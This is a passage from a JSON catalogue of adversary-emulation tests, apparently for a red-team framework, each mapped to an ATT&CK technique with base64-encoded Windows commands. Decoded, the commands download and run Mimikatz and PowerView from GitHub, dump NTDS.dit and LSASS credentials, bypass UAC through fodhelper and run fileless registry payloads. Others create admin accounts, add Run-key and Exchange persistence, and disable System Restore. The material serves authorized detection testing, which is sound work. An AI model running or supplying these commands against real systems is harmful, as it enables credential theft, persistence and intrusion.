"OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Dump Active Directory Database with NTDSUtil", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cm1kaXIgL3EgL3MgQzpcV2luZG93c1xUZW1wXG50ZHNfVDEwMDMgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n", "variations": []}, {"test": "c2RiaW5zdC5leGUgNzI5YjliX0F0b21pY1NoaW14ODYuc2Ri", "ability_id": "f1e0b70af38aef921fee49022045546b", "technique_name": "Event Triggered Execution: Application Shimming", "additional_info": {}, "privilege": "", "technique_id": "T1546.011", "platform": "windows", "name": "Application Shim Installation", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["729b9b_AtomicShimx86.sdb", "729b9b_AtomicShimx86.sdb"], "cleanup": ["c2RiaW5zdC5leGUgLXUgNzI5YjliX0F0b21pY1NoaW14ODYuc2RiID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n", "variations": []}, {"test": "cG93ZXJzaGVsbC5leGUgIklFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9mNjUwNTIwYzRiMTAwNGRhZjhiM2VjMDgwMDdhMGI5NDViOTEyNTNhL0V4ZmlsdHJhdGlvbi9JbnZva2UtTWltaWthdHoucHMxJyk7IEludm9rZS1NaW1pa2F0eiAtRHVtcENyZWRzIg==", "ability_id": "59301935c261de08fabf343aed5fb5f5", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Mimikatz", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n", "variations": []}, {"test": "TmV3LUxvY2FsVXNlciAtTmFtZSAiVDExMzYuMDAxX1Bvd2VyU2hlbGwiIC1Ob1Bhc3N3b3Jk", "ability_id": "1d3d2e634f1bc294f04ce84944b30de9", "technique_name": "Create Account: Local Account", "additional_info": {}, "privilege": "", "technique_id": "T1136.001", "platform": "windows", "name": "Create a new user in PowerShell", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUxvY2FsVXNlciAtTmFtZSAiVDExMzYuMDAxX1Bvd2VyU2hlbGwiIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n", "variations": []}, {"test": "dnNzYWRtaW4uZXhlIGNyZWF0ZSBzaGFkb3cgL2Zvcj1DOiAmJiBta2xpbmsgL0QgQzpcVGVtcFx2c3NzdG9yZSBcXD9cR0xPQkFMUk9PVFxEZXZpY2VcSGFyZGRpc2tWb2x1bWVTaGFkb3dDb3B5MQ==", "ability_id": "997c27e2534d821031a32835f9188b56", "technique_name": "OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Create Symlink to Volume Shadow Copy", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n", "variations": []}, {"test": "IyBFbmNvZGVkIHBheWxvYWQgaW4gbmV4dCBjb21tYW5kIGlzIHRoZSBmb2xsb3dpbmcgIlNldC1Db250ZW50IC1wYXRoICIkZW52OlN5c3RlbVJvb3QvVGVtcC9hcnQtbWFya2VyLnR4dCIgLXZhbHVlICJIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0iIjsgcmVnLmV4ZSBhZGQgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcQXRvbWljUmVkVGVhbSIgL3YgQVJUIC90IFJFR19TWiAvZCAiVTJWMExVTnZiblJsYm5RZ0xYQmhkR2dnSWlSbGJuWTZVM2x6ZEdWdFVtOXZkQzlVWlcxd0wyRnlkQzF0WVhKclpYSXVkSGgwSWlBdGRtRnNkV1VnSWtobGJHeHZJR1p5YjIwZ2RHaGxJRUYwYjIxcFl5QlNaV1FnVkdWaGJTST0iOyBpZXggKFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygoZ3AgJ0hLQ1U6XFNvZnR3YXJlXENsYXNzZXNcQXRvbWljUmVkVGVhbScpLkFSVCkpKQ==", "ability_id": "523898649ff03b6f6051b5f92f24e9c9", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell Fileless Script Execution", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLXBhdGggQzpcV2luZG93c1xUZW1wXGFydC1tYXJrZXIudHh0IC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlOyBSZW1vdmUtSXRlbSBIS0NVOlxTb2Z0d2FyZVxDbGFzc2VzXEF0b21pY1JlZFRlYW0gLUZvcmNlIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n", "variations": []}, {"test": "JGxvYWRSZXN1bHQgPSBbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5EcmF3aW5nIik7ZnVuY3Rpb24gc2NyZWVuc2hvdChbRHJhd2luZy5SZWN0YW5nbGVdJGJvdW5kcywgJHBhdGgpIHsgICAkYm1wID0gTmV3LU9iamVjdCBEcmF3aW5nLkJpdG1hcCAkYm91bmRzLndpZHRoLCAkYm91bmRzLmhlaWdodDsgICAkZ3JhcGhpY3MgPSBbRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkYm1wKTsgICAkZ3JhcGhpY3MuQ29weUZyb21TY3JlZW4oJGJvdW5kcy5Mb2NhdGlvbiwgW0RyYXdpbmcuUG9pbnRdOjpFbXB0eSwgJGJvdW5kcy5zaXplKTsgICAkYm1wLlNhdmUoJHBhdGgpOyAgICRncmFwaGljcy5EaXNwb3NlKCk7ICAgJGJtcC5EaXNwb3NlKCk7fWlmICgkbG9hZFJlc3VsdCkgeyAgJGJvdW5kcyA9IFtEcmF3aW5nLlJlY3RhbmdsZV06OkZyb21MVFJCKDAsIDAsIDEwMDAsIDkwMCk7ICAkZGVzdCA9ICIkSE9NRVxEZXNrdG9wXHNjcmVlbnNob3QucG5nIjsgIHNjcmVlbnNob3QgJGJvdW5kcyAkZGVzdDsgIGlmIChUZXN0LVBhdGggLVBhdGggJGRlc3QpIHsgICAgJGRlc3Q7ICAgIGV4aXQgMDsgIH07fTtleGl0IDE7", "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8", "technique_name": "Screen Capture", "additional_info": {}, "privilege": "", "technique_id": "T1113", "platform": "windows", "name": "Screen Capture", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "", "source": "host.screenshot.png", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": ["JGZpbGVQYXRoID0gIiRIT01FXERlc2t0b3Bcc2NyZWVuc2hvdC5wbmciOyBpZiAoVGVzdC1QYXRoIC1QYXRoICRmaWxlUGF0aCkgeyBkZWwgJGZpbGVQYXRoOyB9Ow=="], "executor": "psh", "access": {}, "description": "capture the contents of the screen", "variations": []}, {"test": "UkVHIEFERCAiSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC9WICJBdG9taWMgUmVkIFRlYW0iIC90IFJFR19TWiAvRiAvRCAiQzpcUGF0aFxBdG9taWNSZWRUZWFtLmV4ZSI=", "ability_id": "163b023f43aba758d36f524d146cb8ea", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "Reg Key Run", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UkVHIERFTEVURSAiSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC9WICJBdG9taWMgUmVkIFRlYW0iIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n", "variations": []}, {"test": "R2V0LUFkQ29tcHV0ZXIgLUZpbHRlciAq", "ability_id": "f32d25602b6c142d321b9a0965316916", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Enumerate Active Directory Computers with Get-AdComputer", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n", "variations": []}, {"test": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XGNzYy5leGUgL291dDoiJXRtcCVcVDExMDYuZXhlIiAvdGFyZ2V0OmV4ZSA3MTc1ZjhfQ3JlYXRlUHJvY2Vzcy5jcyAmJiAldG1wJS9UMTEwNi5leGU=", "ability_id": "14ce698d86efe4b5ae828e595840e9ac", "technique_name": "Native API", "additional_info": {}, "privilege": "", "technique_id": "T1106", "platform": "windows", "name": "Execution through API - CreateProcess", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["7175f8_CreateProcess.cs"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.", "variations": []}, {"test": "IkM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSIgLWV4ZWMgYnlwYXNzIC1ub3Byb2ZpbGUgIiRYbWwgPSAoTmV3LU9iamVjdCBTeXN0ZW0uWG1sLlhtbERvY3VtZW50KTskWG1sLkxvYWQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEwNTkuMDAxL3NyYy90ZXN0LnhtbCcpOyRYbWwuY29tbWFuZC5hLmV4ZWN1dGUgfCBJRVgi", "ability_id": "dfdef9d6526e992043fd0209729e0bf8", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Powershell XML requests", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "variations": []}, {"test": "bmV0IHVzZSBcXCN7cmVtb3RlLmhvc3QuZnFkbn1cQyQgL3VzZXI6I3tkb21haW4udXNlci5uYW1lfSAje2RvbWFpbi51c2VyLnBhc3N3b3JkfQ==", "ability_id": "aa6ec4dd-db09-4925-b9b9-43adeb154686", "technique_name": "Remote Services: SMB/Windows Admin Shares", "additional_info": {}, "privilege": "", "technique_id": "T1021.002", "platform": "windows", "name": "Mount Share", "requirements": [{"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_share"}], "module": "plugins.stockpile.app.requirements.not_exists"}, {"relationship_match": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_admin", "target": "domain.user.name"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn"}], "module": "plugins.stockpile.app.requirements.no_backwards_movement"}], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.share_mounted", "relationships": [{"edge": "has_share", "source": "remote.host.fqdn", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": ["bmV0IHVzZSBcXCN7cmVtb3RlLmhvc3QuZnFkbn1cQyQgL2RlbGV0ZQ=="], "executor": "psh", "access": {}, "description": "Mount a windows share", "variations": []}, {"test": "JFBTVmVyc2lvblRhYmxl", "ability_id": "29451844-9b76-4e16-a9ee-d6feab4b24db", "technique_name": "System Information Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1082", "platform": "windows", "name": "PowerShell version", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Discover the PowerShell version", "variations": []}, {"test": "R2V0LU5ldFRDUENvbm5lY3Rpb24=", "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8", "technique_name": "System Network Connections Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1049", "platform": "windows", "name": "Find System Network Connections", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find System Network Connections", "variations": []}, {"test": "c2V0", "ability_id": "b5b9bf30b09bf2f3367effa3022e7aa7", "technique_name": "System Information Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1082", "platform": "windows", "name": "Environment variables discovery on windows", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTAwMy4wMDFcYmluXE91dGZsYW5rLUR1bXBlcnQuZXhl", "ability_id": "acc918c17efc1b84ebcc3bf764211cd4", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Dump LSASS.exe Memory using direct system calls and API unhooking", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIEM6XHdpbmRvd3NcdGVtcFxkdW1wZXJ0LmRtcCA+bnVsIDI+IG51bA=="], "executor": "cmd", "access": {}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgU2V0LUNsaXBib2FyZCAtdmFsdWUgIkF0b21pYyBUMTExNSBUZXN0LCBncmFiIGRhdGEgZnJvbSBjbGlwYm9hcmQgdmlhIFZCQSI7IElFWCAoaXdyICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmVkY2FuYXJ5Y28vYXRvbWljLXJlZC10ZWFtL21hc3Rlci9hdG9taWNzL1QxMjA0LjAwMi9zcmMvSW52b2tlLU1hbERvYy5wczEiIC1Vc2VCYXNpY1BhcnNpbmcpOyBJbnZva2UtTWFsZG9jIC1tYWNyb0ZpbGUgIlBhdGhUb0F0b21pY3NGb2xkZXJcVDExMTVcc3JjXFQxMTE1LW1hY3JvY29kZS50eHQiIC1vZmZpY2VQcm9kdWN0ICJXb3JkIiAtc3ViICJHZXRDbGlwYm9hcmQi", "ability_id": "c0a7ca5473d889ac83792ac31242ad05", "technique_name": "Clipboard Data", "additional_info": {}, "privilege": "", "technique_id": "T1115", "platform": "windows", "name": "Collect Clipboard Data via VBA", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFxhdG9taWNfVDExMTVfY2xpcGJvYXJkX2RhdGEudHh0IiAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n", "variations": []}, {"test": "TmV3LUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtRm9yY2U7IE5ldy1JdGVtUHJvcGVydHkgIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtTmFtZSAiRGVsZWdhdGVFeGVjdXRlIiAtVmFsdWUgIiIgLUZvcmNlOyBTZXQtSXRlbVByb3BlcnR5ICJIS0NVOlxzb2Z0d2FyZVxjbGFzc2VzXG1zLXNldHRpbmdzXHNoZWxsXG9wZW5cY29tbWFuZCIgLU5hbWUgIihkZWZhdWx0KSIgLVZhbHVlICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiIC1Gb3JjZTsgU3RhcnQtUHJvY2VzcyAiQzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhlIg==", "ability_id": "98d52800f80810f334933d2ce3e2c430", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC using Fodhelper - PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3MiIC1mb3JjZSAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n", "variations": []}, {"test": "cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1ub3Byb2ZpbGUgIiRjb21Nc1htbD1OZXctT2JqZWN0IC1Db21PYmplY3QgTXNYbWwyLlNlcnZlclhtbEh0dHA7JGNvbU1zWG1sLk9wZW4oJ0dFVCcsJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEwNTkuMDAxL3NyYy90ZXN0LnBzMScsJEZhbHNlKTskY29tTXNYbWwuU2VuZCgpO0lFWCAkY29tTXNYbWwuUmVzcG9uc2VUZXh0Ig==", "ability_id": "c52954153b1c232afb69f38ea60e76fe", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Powershell MsXml COM object - with prompt", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "variations": []}, {"test": "c2NodGFza3MuZXhlIC9DaGFuZ2UgL1ROICJcTWljcm9zb2Z0XFdpbmRvd3NcU3lzdGVtUmVzdG9yZVxTUiIgL2Rpc2FibGU=", "ability_id": "2d53d6fabd39bf9c70b0dfcdfbbc926d", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - Disable the SR scheduled task", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2NodGFza3MuZXhlIC9DaGFuZ2UgL1ROICJcTWljcm9zb2Z0XFdpbmRvd3NcU3lzdGVtUmVzdG9yZVxTUiIgL2VuYWJsZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n", "variations": []}, {"test": "R2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfVXNlckFjY291bnQ=", "ability_id": "feaced8f-f43f-452a-9500-a5219488abb8", "technique_name": "Account Discovery: Local Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.001", "platform": "windows", "name": "Identify local users", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify all local users", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLWYgKG9iamVjdGNhdGVnb3J5PWNvbXB1dGVyKQ==", "ability_id": "f49eb1d60594139d1331dcbbfe7f029d", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Adfind - Enumerate Active Directory Computer Objects", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "SW5zdGFsbC1UcmFuc3BvcnRBZ2VudCAtTmFtZSBTZWN1cml0eSBJbnRlcm9wIEFnZW50IC1UcmFuc3BvcnRBZ2VudEZhY3RvcnkgTWljcm9zb2Z0LkV4Y2hhbmdlLlNlY3VyaXR5LkludGVyb3AuU2VjdXJpdHlJbnRlcm9wQWdlbnRGYWN0b3J5IC1Bc3NlbWJseVBhdGggYzpccHJvZ3JhbSBmaWxlc1xtaWNyb3NvZnRcRXhjaGFuZ2UgU2VydmVyXHYxNVxiaW5cTWljcm9zb2Z0LkV4Y2hhbmdlLlNlY3VyaXR5LkludGVyb3AuZGxsOyBFbmFibGUtVHJhbnNwb3J0QWdlbnQgU2VjdXJpdHkgSW50ZXJvcCBBZ2VudDsgR2V0LVRyYW5zcG9ydEFnZW50IHwgRm9ybWF0LUxpc3QgTmFtZSxFbmFibGVk", "ability_id": "9425d3aacf44bced9a9d1ec9dc3a70f9", "technique_name": "Server Software Component: Transport Agent", "additional_info": {}, "privilege": "", "technique_id": "T1505.002", "platform": "windows", "name": "Install MS Exchange Transport Agent Persistence", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["aWYoR2V0LUNvbW1hbmQgIkdldC1UcmFuc3BvcnRBZ2VudCIgLUVycm9yQWN0aW9uIElnbm9yZSl7OyAgIERpc2FibGUtVHJhbnNwb3J0QWdlbnQgU2VjdXJpdHkgSW50ZXJvcCBBZ2VudDsgICBVbmluc3RhbGwtVHJhbnNwb3J0QWdlbnQgU2VjdXJpdHkgSW50ZXJvcCBBZ2VudDsgICBHZXQtVHJhbnNwb3J0QWdlbnQ7IH0="], "executor": "psh", "access": {}, "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n", "variations": []}, {"test": "bmV0IHVzZXIgYXJ0LXRlc3QgL2FkZCAmJiBuZXQgdXNlciBhcnQtdGVzdCBQYXNzd29yZDEyMyEgJiYgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgYXJ0LXRlc3QgL2FkZA==", "ability_id": "c009a3a9bb0d52190c9f078f8195bfad", "technique_name": "Valid Accounts: Local Accounts", "additional_info": {}, "privilege": "", "technique_id": "T1078.003", "platform": "windows", "name": "Create local account with admin privileges", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgYXJ0LXRlc3QgL2RlbGV0ZSA+bnVsIDI+JjEgJiYgbmV0IHVzZXIgYXJ0LXRlc3QgL2RlbGV0ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "After execution the new account will be active and added to the Administrators group", "variations": []}, {"test": "d21pYyBxZmUgZ2V0IGRlc2NyaXB0aW9uLGluc3RhbGxlZE9uIC9mb3JtYXQ6Y3N2", "ability_id": "ed736a123da6fb2aab22cfd4f437e8b5", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMI Reconnaissance Software", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n", "variations": []}, {"test": "bmV0IHZpZXcgXFwje3JlbW90ZS5ob3N0LmZxZG59IC9hbGw=", "ability_id": "deeac480-5c2a-42b5-90bb-41675ee53c7e", "technique_name": "Network Share Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1135", "platform": "windows", "name": "View remote shares", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.net_view", "relationships": [{"edge": "has_share", "source": "remote.host.fqdn", "custom_parser_vals": {}, "target": "remote.host.share"}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "View the shares of a remote host", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgRmluZC1Mb2NhbEFkbWluQWNjZXNzIC1WZXJib3Nl", "ability_id": "03c8721619373b6c18a55721a33cad2c", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Find machines where user has local admin access (PowerView)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n", "variations": []}, {"test": 